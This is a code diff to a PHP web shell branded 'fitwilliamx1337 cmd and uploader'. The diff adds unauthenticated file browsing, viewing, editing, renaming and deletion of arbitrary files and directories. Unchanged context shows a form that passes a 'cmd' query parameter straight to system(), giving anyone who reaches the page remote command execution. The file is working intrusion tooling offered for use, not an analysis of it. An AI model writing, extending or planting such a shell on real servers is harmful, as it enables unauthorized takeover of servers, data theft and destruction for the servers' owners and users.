@@ -1,6 +1,8 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<title>fitwilliamx12 cmd and uploader</title>
+    <meta charset="UTF-8">
+    <title>fitwilliamx1337 cmd and uploader</title>
     <style>
         body {
             font-family: Consolas, monospace;
@@ -85,7 +87,7 @@
     </style>
 </head>
 <body>
-    <h1>fitwilliamx12 cmd and uploader  |   <a href="https://instagram.com/fitwilliamx12">> Contact me < </a><br>
+    <h1>fitwilliamx1337 cmd and uploader  |   <a href="https://instagram.com/fitwilliamx1337">> Contact me < </a><br>
     <!-- System Information Section -->
     <div class="system-info">
         <p><strong>SERVER IP:</strong> <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unavailable'; ?></p>
@@ -164,44 +166,124 @@
         }
     }
     ?>
-    <div class="file-list">
-        <h2>File List</h2>
-        <?php
-        $files = scandir($currentDir);
-        foreach ($files as $file) {
-            if ($file === '.' || $file === '..') continue;
-            $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
-            $fileSize = is_file($filePath) ? filesize($filePath) : '-';
-            $fileModified = date("Y-m-d H:i:s", filemtime($filePath));
-            
-            echo '<div class="file-item">';
-            if (is_dir($filePath)) {
-                echo '[DIR] <a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a>';
+    <h2>File List</h2>
+    <?php
+    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
+    $files = scandir($currentDir);
+    foreach ($files as $file) {
+        if ($file === '.' || $file === '..') continue;
+        $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
+        $fileSize = is_file($filePath) ? filesize($filePath) : '-';
+        $fileModified = date("Y-m-d H:i:s", filemtime($filePath));
+        
+        echo '<div class="file-item">';
+        if (is_dir($filePath)) {
+            echo '[DIR] <a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a>' .
+                 '  | <a href="?delete_dir=' . urlencode($filePath) . '" style="color: red;">Delete</a>' .
+                 '  | <a href="?rename_dir=' . urlencode($filePath) . '" style="color: yellow;">Rename</a>';
+        } else {
+            echo '[FILE] ' . htmlspecialchars($file) . ' | Size: ' . $fileSize . ' bytes | Modified: ' . $fileModified .
+                 '  | <a href="?view=' . urlencode($filePath) . '">View</a>' .
+                 '  | <a href="?edit=' . urlencode($filePath) . '">Edit</a>' .
+                 '  | <a href="?delete=' . urlencode($filePath) . '" style="color: red;">Delete</a>' .
+                 '  | <a href="?rename=' . urlencode($filePath) . '" style="color: yellow;">Rename</a>';
+        }
+        echo '</div>';
+    }
+
+    // Delete Directory
+    if (isset($_GET['delete_dir'])) {
+        $deleteDirPath = $_GET['delete_dir'];
+        if (is_dir($deleteDirPath)) {
+            if (deleteDirectory($deleteDirPath)) {
+                echo '<p style="color: lime;">Directory deleted successfully: ' . htmlspecialchars(basename($deleteDirPath)) . '</p>';
             } else {
-                echo '[FILE] ' . htmlspecialchars($file) . ' | Size: ' . $fileSize . ' bytes | Modified: ' . $fileModified .
-                '  | <a href="?delete=' . urlencode($filePath) . '" style="color: red;">Delete</a>';
-            }
-            echo '</div>';
-        }
-        // File Deletion
-        if (isset($_GET['delete'])) {
-            $deletePath = $_GET['delete'];
-            if (is_file($deletePath) && unlink($deletePath)) {
-                echo '<p style="color: lime;">File deleted successfully: ' . htmlspecialchars(basename($deletePath)) . '</p>';
-            } else {
-                echo '<p style="color: red;">Failed to delete file: ' . htmlspecialchars(basename($deletePath)) . '</p>';
+                echo '<p style="color: red;">Failed to delete directory: ' . htmlspecialchars(basename($deleteDirPath)) . '</p>';
             }
         }
-        // File Viewing
-        if (isset($_GET['view'])) {
-            $viewPath = $_GET['view'];
-            if (is_file($viewPath)) {
-                echo '<h2>View File</h2>';
-                echo '<pre>' . htmlspecialchars(file_get_contents($viewPath)) . '</pre>';
+    }
+
+    // Rename Directory
+    if (isset($_GET['rename_dir'])) {
+        $renameDirPath = $_GET['rename_dir'];
+        if (is_dir($renameDirPath)) {
+            echo '<h2>Rename Directory: ' . htmlspecialchars(basename($renameDirPath)) . '</h2>';
+            if (isset($_POST['new_dir_name'])) {
+                $newDirName = $_POST['new_dir_name'];
+                $newDirPath = dirname($renameDirPath) . DIRECTORY_SEPARATOR . $newDirName;
+                if (rename($renameDirPath, $newDirPath)) {
+                    echo '<p style="color: lime;">Directory renamed successfully to: ' . htmlspecialchars($newDirName) . '</p>';
+                } else {
+                    echo '<p style="color: red;">Failed to rename directory.</p>';
+                }
             }
+            echo '<form method="POST">';
+            echo '<input type="text" name="new_dir_name" placeholder="Enter new directory name" required>';
+            echo '<input type="submit" value="Rename">';
+            echo '</form>';
         }
-        ?>
-    </div>
+    }
+
+    // Rename File
+    if (isset($_GET['rename'])) {
+        $renameFilePath = $_GET['rename'];
+        if (is_file($renameFilePath)) {
+            echo '<h2>Rename File: ' . htmlspecialchars(basename($renameFilePath)) . '</h2>';
+            if (isset($_POST['new_file_name'])) {
+                $newFileName = $_POST['new_file_name'];
+                $newFilePath = dirname($renameFilePath) . DIRECTORY_SEPARATOR . $newFileName;
+                if (rename($renameFilePath, $newFilePath)) {
+                    echo '<p style="color: lime;">File renamed successfully to: ' . htmlspecialchars($newFileName) . '</p>';
+                } else {
+                    echo '<p style="color: red;">Failed to rename file.</p>';
+                }
+            }
+            echo '<form method="POST">';
+            echo '<input type="text" name="new_file_name" placeholder="Enter new file name" required>';
+            echo '<input type="submit" value="Rename">';
+            echo '</form>';
+        }
+    }
+
+    // Delete File
+    if (isset($_GET['delete'])) {
+        $deletePath = $_GET['delete'];
+        if (is_file($deletePath) && unlink($deletePath)) {
+            echo '<p style="color: lime;">File deleted successfully: ' . htmlspecialchars(basename($deletePath)) . '</p>';
+        } else {
+            echo '<p style="color: red;">Failed to delete file: ' . htmlspecialchars(basename($deletePath)) . '</p>';
+        }
+    }
+
+    // File Viewing
+    if (isset($_GET['view'])) {
+        $viewPath = $_GET['view'];
+        if (is_file($viewPath)) {
+            echo '<h2>View File: ' . htmlspecialchars(basename($viewPath)) . '</h2>';
+            echo '<pre>' . htmlspecialchars(file_get_contents($viewPath)) . '</pre>';
+            echo '<a href="?dir=' . urlencode(dirname($viewPath)) . '">Back to File List</a>';
+        }
+    }
+
+    // File Editing
+    if (isset($_GET['edit'])) {
+        $editPath = $_GET['edit'];
+        if (is_file($editPath)) {
+            echo '<h2>Edit File: ' . htmlspecialchars(basename($editPath)) . '</h2>';
+            if (isset($_POST['content'])) {
+                // Save changes
+                file_put_contents($editPath, $_POST['content']);
+                echo '<p style="color: lime;">File saved successfully.</p>';
+            }
+            $fileContent = file_get_contents($editPath);
+            echo '<form method="POST">';
+            echo '<textarea name="content" rows="20" cols="80">' . htmlspecialchars($fileContent) . '</textarea><br>';
+            echo '<input type="submit" value="Save">';
+            echo '</form>';
+            echo '<a href="?dir=' . urlencode(dirname($editPath)) . '">Back to File List</a>';
+        }
+    }
+    ?>
     <h2>CMD [ Linux ]</h2>
     <form method="GET">
         <input type="text" name="cmd" autofocus size="80" placeholder="Enter command (e.g., ls -la)">
@@ -212,7 +294,7 @@
     if (!empty($_GET['cmd'])) {
         $command = $_GET['cmd'];
         echo "Command: " . $command . "\n\n";
-        // Jalankan perintah Linux
+        // Run Linux Command
         system($command . ' 2>&1');
     }
     ?>
